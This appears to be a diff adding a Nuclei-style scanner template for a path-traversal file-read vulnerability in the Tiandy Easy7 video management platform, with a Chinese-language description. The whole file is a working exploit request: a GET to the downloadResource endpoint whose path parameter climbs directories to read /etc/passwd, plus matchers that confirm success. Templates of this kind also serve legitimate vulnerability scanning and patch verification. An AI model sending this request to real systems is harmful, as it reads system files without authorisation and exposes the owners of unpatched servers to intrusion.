@@ -1,0 +1,23 @@
+id: tiandy-easy7-video-platform-lfi
+
+info:
+  name: "天地伟业Easy7综合管理平台downloadResource接口文件访问控制缺陷"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    天地伟业Easy7综合管理平台基于分布式架构实现模数混合切换显示、权限控制及数据存储功能，其智能检索与视频诊断模块存在文件访问控制缺陷。攻击者可利用该漏洞通过构造特定路径参数，绕过系统校验机制获取非授权文件内容，包括但不限于配置文件、敏感数据及系统资源。
+  tags: 天地伟业Easy7
+
+http:
+- raw:
+  - |
+    GET /Easy7/rest/file/downloadResource?path=../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0:'
